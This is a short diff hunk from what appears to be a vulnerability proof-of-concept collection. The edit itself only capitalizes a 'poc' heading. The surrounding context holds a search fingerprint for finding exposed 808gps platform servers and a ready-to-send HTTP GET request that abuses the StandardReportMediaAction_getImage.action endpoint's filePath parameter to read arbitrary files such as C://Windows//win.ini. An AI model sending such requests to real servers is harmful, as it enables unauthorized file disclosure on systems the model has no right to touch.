@@ -5,7 +5,7 @@
 body="./open/webApi.html"||body="/808gps/"
 ```
 
-## poc
+## POC
 ```
 GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
 Host:127.0.0.1
